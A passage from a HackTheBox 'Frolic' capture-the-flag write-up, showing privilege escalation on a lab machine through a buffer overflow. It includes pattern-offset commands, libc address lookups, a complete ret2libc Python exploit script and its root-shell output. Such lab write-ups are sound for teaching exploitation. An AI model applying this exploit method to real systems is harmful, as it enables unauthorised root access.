overflow</ul><li><code class="language-plaintext highlighter-rouge">strcnpy</code> should be used instead</ol></div></blockquote><li>Buffer Overflow<ol><li>Create pattern<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot]
 └─# msf-pattern_create -l 70
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
</pre></table></code></div></div><li>Determine Pattern Address <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921021715.png" alt="" data-proofer-ignore><ul><li>Address: <code class="language-plaintext highlighter-rouge">0x62413762</code></ul><li>Determine <code class="language-plaintext highlighter-rouge">EIP</code> offset<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic]
 └─# msf-pattern_offset -q 0x62413762
 [*] Exact match at offset 52
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">EIP</code> offset: 52</ul><li>Ensure <code class="language-plaintext highlighter-rouge">EIP</code> offset is correct<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> gdb-peda$ run  $(python -c 'print "A" * 52 + "B" * 4 + "C" * 200')
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921022151.png" alt="" data-proofer-ignore></p><ul><li>We good 👌</ul><li>Use this <code class="language-plaintext highlighter-rouge">ret2libc.py</code> code from <a href="https://yufongg.github.io/posts/Node/#privilege-escalation---7-bof">HackTheBox - Node</a><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre> <span class="c1">#!/usr/bin/env python
</span> <span class="kn">import</span> <span class="nn">struct</span>
 <span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
			
 <span class="n">libc_base_addr</span> <span class="o">=</span> 
 <span class="n">system_off</span>     <span class="o">=</span> 
 <span class="n">exit_off</span>       <span class="o">=</span>   
 <span class="n">arg_off</span>        <span class="o">=</span> 
			
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_base_addr</span><span class="o">+</span><span class="n">system_off</span><span class="p">)</span>
 <span class="n">exit_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">libc_base_addr</span><span class="o">+</span><span class="n">exit_off</span><span class="p">)</span>
 <span class="n">arg_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">libc_base_addr</span><span class="o">+</span><span class="n">arg_off</span><span class="p">)</span>
			
 <span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="o">&lt;</span><span class="n">EIP</span> <span class="n">OFFSET</span><span class="o">&gt;</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">system_addr</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">exit_addr</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">arg_addr</span>
			
		
 <span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s">"BINARY"</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
</pre></table></code></div></div><li>Obtain <code class="language-plaintext highlighter-rouge">lib_base_addr</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> www-data@frolic:~/html$ ldd /home/ayush/.binary/rop | grep libc.so.6
         libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
 www-data@frolic:~/html$ ldd /home/ayush/.binary/rop | grep libc.so.6
         libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
</pre></table></code></div></div><ul><li>You can see that the address remains the same, this is because <code class="language-plaintext highlighter-rouge">ASLR</code> is disabled<li><code class="language-plaintext highlighter-rouge">lib_base_addr = 0xb7e19000 </code></ul><li>Obtain <code class="language-plaintext highlighter-rouge">system_off</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> www-data@frolic:~/html$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
    245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
   1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
 www-data@frolic:~/html$ 
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">system_off = 0x0003ada0</code></ul><li>Obtain <code class="language-plaintext highlighter-rouge">exit_off</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> www-data@frolic:~/html$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@'
    141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
 www-data@frolic:~/html$
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">exit_off = 0x0002e9d0</code></ul><li>Obtain <code class="language-plaintext highlighter-rouge">arg_off</code> - where <code class="language-plaintext highlighter-rouge">/bin/sh</code> is<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@frolic:~/html$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep bin/sh
  15ba0b /bin/sh
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">arg_off = 0x15ba0b</code></ul><li>Final <code class="language-plaintext highlighter-rouge">ret2libc.py</code> script<div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
			
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="mh">0xb7e19000</span>
<span class="n">system_off</span>     <span class="o">=</span> <span class="mh">0x0003ada0</span>
<span class="n">exit_off</span>       <span class="o">=</span> <span class="mh">0x0002e9d0</span>  
<span class="n">arg_off</span>        <span class="o">=</span> <span class="mh">0x0015ba0b</span>
			
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_base_addr</span><span class="o">+</span><span class="n">system_off</span><span class="p">)</span>
<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">libc_base_addr</span><span class="o">+</span><span class="n">exit_off</span><span class="p">)</span>
<span class="n">arg_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">libc_base_addr</span><span class="o">+</span><span class="n">arg_off</span><span class="p">)</span>
			
<span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">52</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">system_addr</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">exit_addr</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">arg_addr</span>
			
<span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s">"/home/ayush/.binary/rop"</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
</pre></table></code></div></div><li>Run <code class="language-plaintext highlighter-rouge">ret2libc.py</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>www-data@frolic:/tmp$ python exploit.py 
# id;whoami
uid=0(root) gid=33(www-data) groups=33(www-data)
root
# 
</pre></table></code></div></div></ol><li>Demo - BOF <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/vmware_M64Vq0ejPu.gif" alt="" data-proofer-ignore></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bof-linux-bof/" class="post-tag no-text-decoration" >bof/linux-bof</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a> <a href="/tags/tcp-80-http-web-app-cms-exploit/" class="post-tag no-text-decoration" >tcp/80-http/web-app-cms-exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Frolic - Yufong&amp;u=https://yufongg.github.io/posts/Frolic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Blunder/"><div class="card-body"> <em class="timeago small" data-ts="1672502400" > 2023-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering bludit CMS running, it is vulnerable to a bruteforce protection bypass, directory traversal + image upload exec vulnerability. With ce...</p></div></div></a></div><div class="card"> <a href="/posts/BrainFuck/"><div class="card-body"> <em class="timeago small" data-ts="1660838400" > 2022-08-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - BrainFuck</h3><div class="text-muted small"><p> Overview This is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox. This machine begins w/ us enumerating several subdomains via NMAP’s HTTPS script, followed by a wordpress plugin ...</p></div></div></a></div><div class="card"> <a href="/posts/Nibbles/"><div class="card-body"> <em class="timeago small" data-ts="1661097600" > 2022-08-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Nibbles</h3><div class="text-muted small"><p> Overview This machine begins w/ web directory enumeration revealing files and directories that discloses the username, CMS version and login page of the webpage, allowing us to login as an admin us...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Blocky/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Blocky</p></a> <a href="/posts/Postman/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Postman</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Frolic/'; this.page.identifier = '/posts/Frolic/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
